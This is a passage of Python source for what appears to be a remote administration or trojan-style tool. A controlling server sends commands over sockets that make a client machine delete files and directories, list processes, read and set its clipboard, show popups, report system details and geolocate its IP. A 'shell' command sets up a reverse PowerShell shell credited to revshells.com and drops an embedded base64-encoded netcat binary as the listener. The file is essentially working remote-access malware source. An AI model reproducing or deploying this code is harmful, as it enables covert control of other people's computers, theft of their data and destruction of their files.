            return

        success_indicator = b"y"
        try:
            shutil.rmtree(path)
        except PermissionError:
            success_indicator = b"p"
        except FileNotFoundError:
            success_indicator = b"d"
        except OSError:
            success_indicator = b"n"

        if os.path.isfile(path):
            success_indicator = b"f"

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"n":
                print("There was an error when deleting the directory")
                return CommandResult(DoubleCommandResult.failure)
            case b"d":
                print("Directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case b"p":
                print("The client does not have permission to remove such directory")
                return CommandResult(DoubleCommandResult.failure)
            case b"f":
                print("That path is a file")
                return CommandResult(DoubleCommandResult.failure)
            case b"y":
                print("Successfully deleted directory")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "del", "del [ file path ]", "Deletes a file on the client", [ArgumentType.string]
)
class DeleteFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = recieve_string(sock, True)
        except OSError:
            return

        try:
            os.remove(path)
        except PermissionError:
            success_indicator = b"p"
        except FileNotFoundError:
            success_indicator = b"d"
        except OSError:
            success_indicator = b"n"
        else:
            success_indicator = b"y"

        if os.path.isdir(path):
            success_indicator = b"f"

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"n":
                print("There was an error when deleting the file")
                return CommandResult(DoubleCommandResult.failure)
            case b"d":
                print("Directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case b"p":
                print("The client does not have permission to remove such file")
                return CommandResult(DoubleCommandResult.failure)
            case b"f":
                print("That path is a directory")
                return CommandResult(DoubleCommandResult.failure)
            case b"y":
                print("Successfully deleted file")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "touch",
    "touch [ file path ]",
    "Creates a file on the client",
    [ArgumentType.string],
)
class Touch(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os.path

        try:
            path = recieve_string(sock, True)
        except OSError:
            return

        try:
            if os.path.exists(path):
                raise FileExistsError("file already exists")
            open(path, "wb").close()
        except PermissionError:
            success_indicator = b"p"
        except FileExistsError:
            success_indicator = b"f"
        except FileNotFoundError:
            success_indicator = b"d"
        except OSError:
            success_indicator = b"n"
        else:
            success_indicator = b"y"

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"n":
                print("There was an error when creating the file")
                return CommandResult(DoubleCommandResult.failure)
            case b"f":
                print("File already exists")
                return CommandResult(DoubleCommandResult.failure)
            case b"d":
                print("Parent directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case b"p":
                print("The client does not have permission to create such file")
                return CommandResult(DoubleCommandResult.failure)
            case b"y":
                print("Successfully created file")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "list_procs",
    "list_procs",
    "Lists processes running on the client",
    [],
    list[tuple[int, str]],
    required_client_modules=["psutil"],
)
class ListProcesses(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import psutil

        for proc in psutil.process_iter(["pid", "name"]):
            try:
                if proc.pid == 0:
                    continue
                send_integer(sock, proc.pid)

                send_string(sock, proc.name())
            except psutil.Error:
                continue
            except OSError:
                return
        try:
            send_integer(sock, 0)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        procs = []
        while True:
            try:
                pid = recieve_integer(client.socket)
                if pid == 0:
                    break
                proc_name = recieve_string(client.socket, True)

                print(f"{pid} {'-' * (11 - len(str(pid)))}> {proc_name}")
                procs.append((pid, proc_name))
            except (OSError, MemoryError):
                break

        return CommandResult(DoubleCommandResult.success, procs)


@add_double_command(
    "chdir",
    "chdir [ path ]",
    "Changes the working directory on the client",
    [ArgumentType.string],
)
class ChangeCWD(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = recieve_string(sock, True)
        except OSError:
            return

        success_indicator = b"y"
        try:
            os.chdir(path)
        except PermissionError:
            success_indicator = b"p"
        except FileNotFoundError:
            success_indicator = b"f"
        except OSError:
            success_indicator = b"n"

        try:
            sock.sendall(success_indicator)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Error sending path to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print("Sent path but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"y":
                print("Successfully changed working directory")
                return CommandResult(DoubleCommandResult.success)
            case b"n":
                print("Client says that the working directory is invalid")
                return CommandResult(DoubleCommandResult.failure)
            case b"f":
                print("Directory not found on client")
                return CommandResult(DoubleCommandResult.failure)
            case b"p":
                print("Client does not have permission to enter such directory")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent path but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.failure)


@add_double_command(
    "clipboard_set",
    "clipboard_set [ string to set ]",
    "Sets the clipboard value on the client",
    [ArgumentType.string],
    required_client_modules=["pyperclip"],
)
class SetClipboard(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import pyperclip

        try:
            value = recieve_string(sock, True)
        except OSError:
            return

        pyperclip.copy(value)

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            send_string(client.socket, params[0])
        except OSError:
            print("Failed whilst sending string to client")
            return CommandResult(DoubleCommandResult.conn_error)

        print("Asked client to copy string")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "clipboard_get",
    "clipboard_get",
    "Gets the clipboard value on the client",
    [],
    str,
    required_client_modules=["pyperclip"],
)
class GetClipboard(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import pyperclip

        try:
            value = pyperclip.paste()
            send_string(sock, value)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            value = recieve_string(client.socket, True)
        except OSError:
            print("Failed whilst recieving string from client")
            return CommandResult(DoubleCommandResult.conn_error)

        print(f"Client clipboard: {value}")
        return CommandResult(DoubleCommandResult.success, value)


@add_double_command(
    "popup",
    "popup [ title ] [ message ] { level }",
    "Displays a popup message on the clients screen",
    [ArgumentType.string, ArgumentType.string, ArgumentType.optional_string]
)
class Popup(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import threading

        def message_box(title: str, message: str, level: str) -> None:
            import tkinter.messagebox
            import tkinter

            root = tkinter.Tk()
            root.withdraw()

            match level.casefold():
                case "info":
                    tkinter.messagebox.showinfo(title, message)
                case "warning":
                    tkinter.messagebox.showwarning(title, message)
                case "error":
                    tkinter.messagebox.showerror(title, message)

            root.destroy()

        try:
            cancel = recieve_boolean(sock)
        except OSError:
            return
        
        if cancel:
            return

        try:
            title = recieve_string(sock, True)
            message = recieve_string(sock, True)
            level = recieve_string(sock, True)
        except OSError:
            return

        fail = False
        try:
            threading.Thread(
                target=message_box,
                args=[title, message, level],
                name="Popup",
            ).start()
        except Exception:
            fail = True

        try:
            sock.sendall(b"n" if fail else b"y")
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        if len(params) == 3 and params[2].casefold() not in ("info", "warning", "error"):
            try:
                send_boolean(client.socket, True)
            except OSError:
                pass
            return CommandResult(DoubleCommandResult.param_error)

        try:
            send_string(client.socket, params[0])
            send_string(client.socket, params[1])
            send_string(client.socket, params[2])
        except OSError:
            print("Failed to send message to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1)
        except OSError:
            print("Sent message, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case b"y":
                print("Successfully displayed popup")
                return CommandResult(DoubleCommandResult.success)
            case b"n":
                print("Failed to display popup")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent message, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "sysinfo",
    "sysinfo",
    "Gathers information about the client computer",
    [],
    dict[str, str | int],
)
class GatherSystemInformation(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import platform
        import os

        send_item(sock, os.cpu_count())  # type: ignore
        send_item(sock, platform.architecture()[0])
        send_item(sock, platform.machine())
        send_item(sock, platform.node())
        send_item(sock, platform.system())
        send_item(sock, platform.platform())

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        output = {}
        try:
            output["CPU count"] = recieve_integer(client.socket)
            output["Architecture"] = recieve_string(client.socket)
            output["Machine type"] = recieve_string(client.socket)
            output["Network name"] = recieve_string(client.socket)
            output["System name"] = recieve_string(client.socket)
            output["System version"] = recieve_string(client.socket)
        except OSError:
            print("Failed to recieve information")
            return CommandResult(DoubleCommandResult.conn_error)

        for key, value in output.items():
            print(f"{key}{' ' * (14 - len(key))} -> {value}")
        return CommandResult(DoubleCommandResult.success, output)


@add_double_command(
    "ipinfo",
    "ipinfo [ api key for ipinfo.io ]",
    "Gets information about the client IP",
    [ArgumentType.string],
    dict,
    required_server_modules=["ipinfo"],
)
class Geolocate(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import urllib.request

        try:
            send_bytes(sock, urllib.request.urlopen("https://api.ipify.org").read())
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        from typing import Any
        import ipinfo

        def indent_print(item: dict[str, Any], indent: int = 0) -> None:
            longest_key_len = max([len(key) for key in item])
            for key, value in item.items():
                if isinstance(value, dict):
                    print(
                        f"{' ' * indent}{key.title().replace('_', ' ')} {'-' * ((longest_key_len + 6) - len(key))}>"
                    )
                    indent_print(value, indent + 4)
                else:
                    print(
                        f"{' ' * indent}{key.title().replace('_', ' ')} {'-' * ((longest_key_len + 1) - len(key))}> {value}"
                    )

        try:
            target_ip = recieve_string(client.socket, True)
        except OSError:
            print("Failed to recieve client ip, defaulting to stored one")
            target_ip = client.ip

        handler = ipinfo.getHandler(params[0])
        info = handler.getDetails(target_ip)

        indent_print(info.all)

        return CommandResult(DoubleCommandResult.success, info.all)


@add_double_command(
    "shell",
    "shell",
    "Runs and interactive shell on the client",
    [],
    supported_os=[OSType.ms_windows],
    no_new_process=True,
    no_multitask=True,
    max_selected=1
)
class Shell(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        # shell structure from revshells.com
        import subprocess
        import threading
        import socket

        def server_to_peer(
            sock: socket.socket, process: subprocess.Popen, running: dict[str, bool]
        ) -> None:
            while running["running"]:
                try:
                    data = sock.recv(1024)
                except TimeoutError:
                    continue
                except OSError:
                    return
                if len(data) > 0:
                    process.stdin.write(data)  # type: ignore
                    process.stdin.flush()  # type: ignore

        def peer_to_server(
            sock: socket.socket, process: subprocess.Popen, running: dict[str, bool]
        ) -> None:
            while running["running"]:
                try:
                    sock.send(process.stdout.read(1))  # type: ignore
                except OSError:
                    return

        powershell_process = subprocess.Popen(
            ["powershell"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE,
        )

        try:
            shell_sock = socket.socket()
            shell_sock.setblocking(True)
            shell_sock.settimeout(5)
            shell_sock.connect((sock.getpeername()[0], recieve_integer(sock)))
        except OSError:
            return

        running = {"running": True}
        s2p_thread = threading.Thread(
            target=server_to_peer,
            args=[shell_sock, powershell_process, running],
            name="Reverse shell S2P",
        )
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(
            target=peer_to_server,
            args=[shell_sock, powershell_process, running],
            name="Reverse shell P2S",
        )
        p2s_thread.daemon = True
        p2s_thread.start()

        powershell_process.wait()
        running["running"] = False
        shell_sock.close()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        from shared.command_consts import NETCAT_B64_ZLIB_EXE
        import subprocess
        import socket
        import base64
        import zlib
        import os

        def find_random_port() -> int:
            sock = socket.socket()
            sock.bind(("localhost", 0))
            _, port = sock.getsockname()
            sock.close()
            return port

        def bail(msg: str) -> None:
            print(msg)
            os.remove(temp_file)

        temp_file = f"{os.getenv('TEMP')}/nc.exe"
        with open(temp_file, "wb") as netcat_exe:
            netcat_exe.write(zlib.decompress(base64.b64decode(NETCAT_B64_ZLIB_EXE)))

        port = find_random_port()
        try:
            send_integer(client.socket, port)
        except OSError:
            bail("Failed to send port to client")
            return CommandResult(DoubleCommandResult.conn_error)

        subprocess.Popen(
            [temp_file, "-lp", str(port)],
            shell=True,
        ).wait()
        bail("Connection terminated")

        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "playsound",
    "playsound [ local file path ]",
    "Plays a sound file on the client",
    [ArgumentType.string],
    required_client_modules=["pyglet"],
)
class PlaySound(DoubleCommand):
    @staticmethod
    def play_sound(path: str) -> None:
        import pyglet

        def on_player_eos() -> None:
            pyglet.app.exit()

        player = pyglet.media.Player()
        source = pyglet.media.StaticSource(pyglet.media.load(path))
        player.queue(source)
        player.play()
        player.push_handlers(on_player_eos)
        pyglet.app.run()

    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import multiprocessing
        import os

        try:
            sound_contents = recieve_bytes(sock)
            if sound_contents == b"EXIT":
                return
            sound_format = recieve_string(sock)
        except OSError:
            return

        sound_file = f"{os.getenv('TEMP')}/sound.{sound_format}"
        with open(sound_file, "wb") as sound_file_fd:
            sound_file_fd.write(sound_contents)

        multiprocessing.Process(
            target=PlaySound.play_sound, args=[sound_file], name="Play sound"
        ).start()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import os.path

        def bail(display_msg: str, bail_client: bool) -> None:
            print(display_msg)
            if bail_client:
                try:
                    send_bytes(client.socket, b"EXIT")
                except OSError:
                    pass

        try:
            with open(params[0], "rb") as sound_file_fd:
                sound_contents = sound_file_fd.read()
        except FileNotFoundError:
            bail(f"File '{params[0]}' not found", True)
            return CommandResult(DoubleCommandResult.param_error)

        try:
            send_bytes(client.socket, sound_contents)
            send_string(client.socket, os.path.splitext(params[0])[1])
        except OSError:
            bail("Failed whilst sending sound to client", False)
            return CommandResult(DoubleCommandResult.conn_error)

        print("Played sound on client")
        return CommandResult(DoubleCommandResult.success)
